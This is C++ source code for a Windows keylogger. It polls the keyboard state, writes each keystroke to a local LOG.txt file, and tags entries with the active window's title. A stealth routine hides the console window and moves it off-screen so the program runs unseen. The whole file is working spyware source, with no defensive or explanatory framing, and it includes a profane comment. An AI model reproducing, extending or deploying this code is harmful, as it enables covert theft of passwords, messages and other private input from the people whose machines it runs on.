#include <fstream>
#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <stdio.h>
#include <string>
#include <cstring>
#include <locale.h>

using namespace std;

const bool DEBUG = true;            //Change this value to print output and bypass stealth

int log(int key,char* file);        //Logs Keys into Files
int filter(int key);                //Filters Backspaces, Shift Hooks and other special ocurrances.
void stealth();                     //Detaches itself from the Console and runs hidden
bool hookShift();               //Activated after Shift is pressed. Makes sure to modify next character.
bool capsLock();
void savePrevWindow();
bool isSameWindow();
void print(string a);
void print(int a);
void backspaceHook();

//Global Variables//
//TELL ME THIS AIN'T CORRECT ONE MORE TIME! I DARE YOU! I DOUBLE DARE YOU MOTHERFUCKER!
CHAR windowName[80];
CHAR prevWindow[80];
bool possibleBackspace = false;
//bool shiftHooked = false;

int main() {
    setlocale(LC_ALL, "Portuguese");
    if (!DEBUG){
        stealth();
    }



    unsigned char i;
    while (true) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767){
                int a = log(i,"LOG.txt");
            }
        }
    }
    return 0;
}

int log(int key,char* file){


    //   Check for Trash //
    //   Left Click  | Right Click | Shift Byprod | CTRL Byprod  | ALT Byproduct| Cancel Butt | Middle Click
    if ( (key == 1) || (key == 2) || (key == 16) || (key == 17) || (key == 18) || (key == 3) || (key == 4) || (key == 37) ||
         (key == 38) || (key == 39) || (key == 40)){
        return 0;
    }


    fstream outFile(file,ios::out | ios::app);


    if (!isSameWindow()){
        outFile << "\n\n */\n/*>>> " << windowName << endl;
        outFile << ">---------------------------------------------------\n\n";
    }

    savePrevWindow();


    //CHECK FOR SPECIAL CHARACTERS

    //SHIFT
    if (key == VK_LSHIFT || key == VK_RSHIFT ){
        print(" [SHIFT] ");
        //outFile << "[SHIFT]";
    }
    //ALT
    else if (key == VK_LMENU || key == VK_RMENU ){
        print(" [ALT] ");
        outFile << " [ALT] ";
    }
    //CTRL
    else if (key == VK_LCONTROL || key == VK_RCONTROL ){
        print(" [CTRL] ");
        outFile << " [CTRL] ";
    }
    //CAPSLOCK
    else if (key == VK_CAPITAL){
        print(" [CAPSLOCK] ");
        //outFile << "[SHIFT]";
    }
    //ANYTHING ELSE
    else {
        key = filter(key);
        print(key);
        outFile << (char) key;
    }

    outFile.close();

    return 0;
}

int filter(int key){

    if ((key >= 65) && (key <= 90)){
        if( (!hookShift()) && (!capsLock()) ){
            key +=32;
        }
    }

    else if ((key >= 48) && (key <= 57)){
        if (hookShift()){
            switch(key) {
                case '1' : key = '!'; break;
                case '2' : key = '@'; break;
                case '3' : key = '#'; break;
                case '4' : key = '$'; break;
                case '5' : key = '%'; break;
                case '6' : key = '^'; break;
                case '7' : key = '&'; break;
                case '8' : key = '*'; break;
                case '9' : key = '('; break;
                case '0' : key = ')'; break;
            }
        }
    }
    //SI ES ALGUN EXTRA KEY Y ESTA HOOKED SHIFT
    if (hookShift()){
             if (key == 186){key = ':';}
        else if (key == 187){key = '+';}
        else if (key == 188){key = '<';}
        else if (key == 189){key = '_';}
        else if (key == 190){key = '>';}
        else if (key == 191){key = ':';}
        else if (key == 192){key = '~';}
        else if (key == 193){key = '?';}
        else if (key == 219){key = '{';}
        else if (key == 220){key = '|';}
        else if (key == 221){key = '}';}
        else if (key == 222){key = '~';}
    }
    //SI ES ALGUN EXTRA KEY Y NO ESTA HOOKED SHIFT
    else {
        if (key == 186){key = ';';}
        else if (key == 187){key = '=';}
        else if (key == 188){key = ',';}
        else if (key == 189){key = '-';}
        else if (key == 190){key = '.';}
        else if (key == 191){key = ';';}
        else if (key == 192){key = '~';}
        else if (key == 193){key = '/';}
        else if (key == 194){key = '.';}
        else if (key == 219){key = '[';}
        else if (key == 220){key = '\\';}
        else if (key == 221){key = ']';}
        else if (key == 222){key = '^';}
    }

/*

    //NUMPAD (Intento 2)
         if (key == VK_NUMPAD0) {key = '0';}
    else if (key == VK_NUMPAD1) {key = '1';}
    else if (key == VK_NUMPAD2) {key = '2';}
    else if (key == VK_NUMPAD3) {key = '3';}
    else if (key == VK_NUMPAD4) {key = '4';}
    else if (key == VK_NUMPAD5) {key = '5';}
    else if (key == VK_NUMPAD6) {key = '6';}
    else if (key == VK_NUMPAD7) {key = '7';}
    else if (key == VK_NUMPAD8) {key = '8';}
    else if (key == VK_NUMPAD9) {key = '9';}
*/

/*

         if(key == 63) {key = '?';}
    else if (key == 47){key = '/';}
    else if (key == 42){key = '*';}
    else if (key == 43){key = '+';}
    else if (key == 44){key = ',';}
    else if (key == 45){key = '-';}
    else if (key == 46){key = '.';}
*/

    return key;
}

bool capsLock(){
    if (GetKeyState(VK_CAPITAL) == 1){return true;}
    if (GetKeyState(VK_CAPITAL) == -127){return true;}
    return false;
}

bool hookShift(){

    if (GetKeyState(VK_LSHIFT) < -120){return true;}
    if (GetKeyState(VK_RSHIFT) < -120){return true;}

    return false;


}

void backspaceHook(){
    //fstream outFile(file,ios::out);
    //outFile.seekg(ios_base::end);




}

void stealth(){
    HWND stealth;   //Name of the Console
    AllocConsole(); //Allocates New Console
    stealth = FindWindowA("ConsoleWindowClass", NULL);  //Finds Window
    MoveWindow(stealth,-300,-700,0,0,TRUE);             //Moves Window out of Sight
    ShowWindow(stealth,0);                              //Cloaks Window

    SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);

}

void savePrevWindow(){
    HWND hwnd=GetForegroundWindow();

    int test=GetWindowText(hwnd,prevWindow,80);
}

bool isSameWindow(){

    HWND hwnd=GetForegroundWindow();
    int test=GetWindowText(hwnd,windowName,80);

    //char* CurrWin = (char*) windowName;
    //char* PrevWin = (char*) prevWindow;
    //cout << windowName << prevWindow;

    if (strcmp(windowName,prevWindow) == 0){
        return true;
    }
    else{ return false;}
}

void print(string a){
    if (DEBUG){
        cout << a << endl;
    }
}

void print(int a){
    if (DEBUG){
        cout << (char) a << " : " << (int) a << endl;
    }
}
